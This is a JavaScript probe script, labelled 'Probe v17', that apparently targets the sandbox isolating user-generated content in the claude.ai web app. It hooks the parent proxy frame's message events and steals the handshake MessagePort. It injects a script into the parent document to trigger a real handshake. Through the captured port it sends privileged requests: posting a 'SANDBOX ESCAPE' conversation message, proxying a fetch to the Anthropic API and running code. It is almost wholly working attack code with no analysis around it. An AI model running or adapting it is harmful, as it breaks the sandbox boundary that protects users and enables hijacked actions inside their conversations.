// Probe v17 - Two-phase port capture
// Phase 1: Capture any port (from manual or test handshake)
// Phase 2: Trigger REAL V2e handshake from proxy context
// Phase 3: Capture the REAL port (connected to handlePortMessage)

console.log("=== PROBE v17 - TWO-PHASE PORT CAPTURE ===");

let portCount = 0;
let realPort = null;

// Install capture listener on proxy for ALL handshake messages
window.parent.addEventListener('message', function(e) {
  if (e.data?.type === '__sandbox_handshake__' && e.ports?.length > 0) {
    portCount++;
    const port = e.ports[0];
    console.log(`!!! PORT #${portCount} CAPTURED from ${e.origin} !!!`);

    // Store as potential real port
    realPort = port;
    window.__capturedPort = port;

    port.onmessage = (m) => {
      console.log(`PORT #${portCount} MSG:`, JSON.stringify(m.data).slice(0, 800));
    };

    e.stopImmediatePropagation();

    // Test the port with various requests
    setTimeout(() => {
      console.log("Testing port capabilities...");

      port.postMessage({
        channel: 'request',
        requestId: 'send-msg-' + portCount,
        method: 'anthropic.claude.usercontent.sandbox.SendConversationMessage',
        payload: {
          message: 'SANDBOX ESCAPE: Message sent via captured port #' + portCount,
          messageType: 'text',
          '@type': 'type.googleapis.com/anthropic.claude.usercontent.sandbox.SendConversationMessageRequest'
        }
      });

      port.postMessage({
        channel: 'request',
        requestId: 'proxy-fetch-' + portCount,
        method: 'anthropic.claude.usercontent.sandbox.ProxyFetch',
        payload: {
          url: 'https://api.anthropic.com/v1/messages',
          method: 'GET',
          headers: {},
          body: null,
          channelId: 'fetch-ch-' + portCount,
          '@type': 'type.googleapis.com/anthropic.claude.usercontent.sandbox.ProxyFetchRequest'
        }
      });

      port.postMessage({
        channel: 'request',
        requestId: 'run-code-' + portCount,
        method: 'anthropic.claude.usercontent.sandbox.RunCode',
        payload: {
          code: 'document.title + " - " + window.location.origin',
          '@type': 'type.googleapis.com/anthropic.claude.usercontent.sandbox.RunCodeRequest'
        }
      });

      console.log("Sent 3 test requests through port #" + portCount);
    }, 300);
  }

  // Log other messages from claude.ai
  if (e.origin?.includes('claude.ai') && e.data?.type !== '__sandbox_handshake__') {
    console.log("[FROM CLAUDE.AI]", e.data?.method || e.data?.type || 'response', JSON.stringify(e.data).slice(0, 200));
  }
}, true);

console.log("[1] Port catcher installed on proxy");

// Phase 2: Trigger REAL V2e handshake from proxy context
// The proxy is same-origin, so we can inject a script
const script = window.parent.document.createElement('script');
script.textContent = `
  // This runs in the proxy context
  // window.parent = claude.ai (top frame)
  // Send __sandbox_handshake_request__ which triggers V2e.sendHandshakeWithPort()
  window.parent.postMessage({type: "__sandbox_handshake_request__"}, "*");
`;
window.parent.document.head.appendChild(script);
script.remove();

console.log("[2] __sandbox_handshake_request__ sent from proxy to claude.ai");
console.log("Waiting for real V2e port...");
